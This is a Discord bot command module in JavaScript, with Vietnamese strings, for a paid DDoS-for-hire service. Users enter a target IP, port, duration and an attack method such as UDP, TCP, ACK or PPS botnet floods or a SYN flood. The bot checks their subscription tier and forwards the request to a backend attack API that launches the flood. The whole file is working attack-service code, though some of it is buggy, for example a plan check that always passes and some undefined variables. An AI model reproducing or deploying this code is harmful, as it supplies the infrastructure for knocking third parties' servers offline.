const { SlashCommandBuilder, WebhookClient, EmbedBuilder } = require('discord.js');
const axios = require('axios');
const { attack_log, api_free_l4, api_vip_l4, api_admin_l4, block_host } = require('../../config.json');
const webhookURL = attack_log;
const sqlite3 = require('sqlite3').verbose();
const db = new sqlite3.Database('database.db');
const wait = require('node:timers/promises').setTimeout;

module.exports = {
    data: new SlashCommandBuilder()
    .setName('start-l4')
    .setDescription('đấm layer 4')
    .addStringOption(option => option.setName('methods').setDescription('methods đấm').setRequired(true).addChoices(
    { name: 'DNS(FREE)', value: 'DNS-FREE' },
    /*{ name: 'TCP FREE', value: 'TCP-FREE' },
    { name: 'TCP-KILL FREE', value: 'TCPKLL-FREE' },

    { name: 'STDHEX(VIP)', value: 'STDHEX' },
    { name: 'TCPLEGIT(VIP)', value: 'TCPLEGIT' },
    { name: 'ACKFLOOD(VIP)', value: 'ACKFLOOD' },
    { name: 'HOMEHOLDER(VIP)', value: 'HOME' },
    { name: 'SYNFLOOD(VIP)', value: 'SYNFLOOD' },
    { name: 'VIETNIX BYPASS(VIP)', value: 'VIETNIX' },*/

    { name: 'UDP BOTNET(VIP)', value: 'UDP_BOTNET' },
    { name: 'TCP BOTNET(VIP)', value: 'TCP_BOTNET' },
    { name: 'ACK BOTNET(VIP)', value: 'ACK_BOTNET' },
    { name: 'PPS BOTNET(VIP)', value: 'PPS_BOTNET' },
    ))
    .addStringOption(option => option.setName('ip').setDescription('ip server').setRequired(true))
    .addIntegerOption(option => option.setName('port').setDescription('port').setRequired(true))
    .addIntegerOption(option => option.setName('time').setDescription('thời gian đấm').setRequired(true)),
    cooldown: 300,
    async execute(interaction, client) {
        const userId = interaction.user.id;
        await interaction.deferReply({ ephemeral: true });
		await wait(1000);
        db.get('SELECT users_id, plan, exp FROM users WHERE users_id = ?', [userId],async (err, row) => {
        if (err) {
            throw err;
        }
        if (row) {
            if (`${row.plan}` === 'VIP', 'FREE', 'ADMIN') {
               const ip = interaction.options.get('ip').value;
               const port = interaction.options.get('port').value;
               const time = interaction.options.get('time').value;
               const method = interaction.options.get('methods').value;
               const userId = interaction.user.id;
               const hostLink = /^(\d{1,3}\.){3}\d{1,3}$/;
                if (!hostLink.test(ip)) {
                    await interaction.editReply({ content: `sai định dạng host, Vd: 10.0.0.6!`, ephemeral: true });
                    return;
                } else if (block_host.some((word) => interaction.toString().toLowerCase().includes(word))) {
                    await interaction.editReply('ip nằm trong danh sách bị chặn');
                } else {
                    if (port <= 65535) {

                        const free = api_free_l4.replace('[host]', ip).replace('[port]', port).replace('[time]', time).replace('[method]', method);
                        const vip = api_vip_l4.replace('[host]', ip).replace('[port]', port).replace('[time]', time).replace('[method]', method);
                        const admin = api_admin_l4.replace('[host]', ip).replace('[port]', port).replace('[time]', time).replace('[method]', method);
                        
                        if (row.plan === 'FREE') {
                            if (method === 'TCPKILL-FREE' ||
                                method === 'TCP-FREE' ||
                                method === 'UDP-FREE' ||
                                method === "DNS-FREE") {
                                const embed = new EmbedBuilder()
                                .setColor(color)
                                .setTitle(namebot)
                                .setDescription('```'+ `Attack Sent Check DMS` + '```')
                                .setTimestamp()
                                .setFooter({ text: names, iconURL: `${admin_url}` });
                                await interaction.editReply({ embeds: [embed] , ephemeral: true });

                                const Embed = new EmbedBuilder()
                                .setColor(color)
                                .setTitle(namebot)
                                .setDescription('Type: layer4')
                                .addFields({ name: '`🧨 IP:`', value: `\`\`\`css\n[ ${ip} ]\n\`\`\`` })
                                .addFields({ name: '`🛰 PORT:`', value: `\`\`\`css\n[ ${port} ]\n\`\`\`` })
                                .addFields({ name: '`🕛 TIME:`', value: `\`\`\`css\n[ ${time} ]\n\`\`\`` })
                                .addFields({ name: '`🔰 METHOD:`', value: `\`\`\`css\n[ ${method} ]\n\`\`\`` })
                                .addFields({ name: '`💸 PLAN:`', value: `\`\`\`css\n[ ${row.plan} ]\n\`\`\`` })
                                .setImage(img_url)
                                .setTimestamp()
                                .setFooter({ text: names, iconURL: `${admin_url}` });
                                await interaction.user.send({ embeds: [Embed] , ephemeral: true });
                            } else {
                                await interaction.editReply({content: 'bạn ko có đủ plan để sử dụng!', ephemeral: true});
                            }
                        } else if (row.plan === 'VIP' || row.plan === 'ADMIN') {
                            if (method === 'MINECRAFT'||
                            method === 'TCPFLOOD' ||
                            method === 'DNS-FREE' ||
                            method === 'UDPFLOOD' ||
                            method === 'UDPPPS' ||
                            method === 'STDHEX' ||
                            method === 'ACKFLOOD' ||
                            method === 'TCPLEGIT' ||
                            method === 'HOME' ||
                            method === 'SYNFLOOD'||
                            method === 'UDP_BOTNET'||
                            method === 'TCP_BOTNET'||
                            method === 'PPS_BOTNET'||
                            method === 'ACK_BOTNET') {
                                const embed = new EmbedBuilder()
                                .setColor(color)
                                .setTitle(namebot)
                                .setDescription('```'+ `Attack Sent Check DMS` + '```')
                                .setTimestamp()
                                .setFooter({ text: names, iconURL: `${admin_url}` });
                                await interaction.editReply({ embeds: [embed] , ephemeral: true });

                                const Embed = new EmbedBuilder()
                                .setColor(color)
                                .setTitle(namebot)
                                .setDescription('Type: layer4')
                                .addFields({ name: '`🧨 IP:`', value: `\`\`\`css\n[ ${ip} ]\n\`\`\`` })
                                .addFields({ name: '`🛰 PORT:`', value: `\`\`\`css\n[ ${port} ]\n\`\`\`` })
                                .addFields({ name: '`🕛 TIME:`', value: `\`\`\`css\n[ ${time} ]\n\`\`\`` })
                                .addFields({ name: '`🔰 METHOD:`', value: `\`\`\`css\n[ ${method} ]\n\`\`\`` })
                                .addFields({ name: '`💸 PLAN:`', value: `\`\`\`css\n[ ${row.plan} ]\n\`\`\`` })
                                .setImage(img_url)
                                .setTimestamp()
                                .setFooter({ text: names, iconURL: `${admin_url}` });
                                await interaction.user.send({ embeds: [Embed] , ephemeral: true }); 
                            } else {
                                await interaction.editReply({content: 'bạn ko có đủ plan để sử dụng!', ephemeral: true});
                            }
                        }
                        
                        if (row.plan === 'FREE') {
                        axios.get(free)
                            .then(async (response) => {
                                if (response.status === 200) {
                                    console.log('[axios] Kết quả thành công:', response.data);
                                } else if (response.status === 429) {
                                    console.log('[axios] Kết quả không thể kết nối:', response.status);
                                } else if (response.status === 500) {
                                    console.log('[axios] Kết quả không thể kết nối:', response.status);
                                }
                            }).catch(async (error) => {
                                console.error('[axios] Lỗi kết nối:', error.message);
                            });
                        }
                     
                        if (row.plan === 'VIP') {
                        axios.get(vip)
                            .then(async (response) => {
                                if (response.status === 200) {
                                    console.log('[axios] Kết quả thành công:', response.data);
                                } else if (response.status === 429) {
                                    console.log('[axios] Kết quả không thể kết nối:', response.status);
                                } else if (response.status === 500) {
                                    console.log('[axios] Kết quả không thể kết nối:', response.status);
                                }
                            }).catch(async (error) => {
                                console.error('[axios] Lỗi kết nối:', error.message);
                            });
                        }

                        if (row.plan === 'ADMIN') {
                        axios.get(admin)
                            .then(async (response) => {
                                if (response.status === 200) {
                                    console.log('[axios] Kết quả thành công:', response.data);
                                } else if (response.status === 429) {
                                    console.log('[axios] Kết quả không thể kết nối:', response.status);
                                } else if (response.status === 500) {
                                    console.log('[axios] Kết quả không thể kết nối:', response.status);
                                }
                            }).catch(async (error) => {
                                console.error('[axios] Lỗi kết nối:', error.message);
                            });
                        }

                        } else {
                            await interaction.editReply({ content: 'port phải dưới 65535!', ephemeral: true });
                        }
                    }
                }
            } else {
                await interaction.editReply({ content: 'bạn ko có plan để sử dụng!', ephemeral: true });
            }
        });
    }
}